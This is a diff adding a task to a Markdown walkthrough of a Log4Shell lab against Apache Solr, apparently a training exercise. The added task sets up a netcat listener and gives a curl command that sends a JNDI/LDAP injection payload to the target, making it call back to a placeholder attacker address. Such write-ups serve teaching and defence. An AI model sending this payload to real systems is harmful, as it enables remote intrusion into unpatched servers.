@@ -41,6 +41,20 @@ By seeing those entries the user can modify this field below
 
 ![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/c1e6c254c608abf6f30e9be65c81342aca066e38/Screenshot%202026-03-20%20114747.png)
 
+Task 4:
+
+In this task we are going to prove that the target is vulnerable lets set the netcat listener to catch the reverse connection
+
+![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115317.png)
+
+Then make a requset with the curl command curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
+
+![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115330.png)
+
+After this you can receive the reverse connection but the in the reverse connection we cannot perform any commands 
+
+![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115447.png)
+
 
 
 
